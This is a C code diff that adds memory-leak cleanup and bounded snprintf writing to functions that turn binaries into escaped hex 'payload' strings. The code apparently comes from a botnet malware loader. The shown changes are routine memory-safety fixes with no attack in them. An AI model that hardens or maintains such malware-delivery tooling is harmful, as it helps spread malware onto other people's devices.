@@ -29,6 +29,19 @@ BOOL binary_init(void)
         if (tmp == NULL)
         {
             printf("Failed to allocate memory for binary list\n");
+            // SECURITY FIX: Free previously allocated binaries to prevent memory leak
+            for (int j = 0; j < bin_list_len; j++) {
+                if (bin_list[j]) {
+                    if (bin_list[j]->hex_payloads) {
+                        for (int k = 0; k < bin_list[j]->hex_payloads_len; k++) {
+                            free(bin_list[j]->hex_payloads[k]);
+                        }
+                        free(bin_list[j]->hex_payloads);
+                    }
+                    free(bin_list[j]);
+                }
+            }
+            free(bin_list);
             globfree(&pglob);
             return FALSE;
         }
@@ -38,6 +51,19 @@ BOOL binary_init(void)
         if (bin_list[bin_list_len] == NULL)
         {
             printf("Failed to allocate memory for binary\n");
+            // SECURITY FIX: Free previously allocated binaries to prevent memory leak
+            for (int j = 0; j < bin_list_len; j++) {
+                if (bin_list[j]) {
+                    if (bin_list[j]->hex_payloads) {
+                        for (int k = 0; k < bin_list[j]->hex_payloads_len; k++) {
+                            free(bin_list[j]->hex_payloads[k]);
+                        }
+                        free(bin_list[j]->hex_payloads);
+                    }
+                    free(bin_list[j]);
+                }
+            }
+            free(bin_list);
             globfree(&pglob);
             return FALSE;
         }
@@ -110,8 +136,17 @@ static BOOL load(struct binary *bin, char *fname)
         }
         ptr = bin->hex_payloads[bin->hex_payloads_len++];
 
-        for (i = 0; i < n; i++)
-            ptr += sprintf(ptr, "\\x%02x", (uint8_t)rdbuf[i]);
+        for (i = 0; i < n; i++) {
+            size_t remaining = (bin->hex_payloads[bin->hex_payloads_len - 1] + (4 * n) + 8) - ptr;
+            int written = snprintf(ptr, remaining, "\\x%02x", (uint8_t)rdbuf[i]);
+            if (written > 0 && written < remaining) {
+                ptr += written;
+            } else {
+                printf("Buffer overflow prevented in hex payload generation\n");
+                fclose(file);
+                return FALSE;
+            }
+        }
     }
 
     fclose(file);
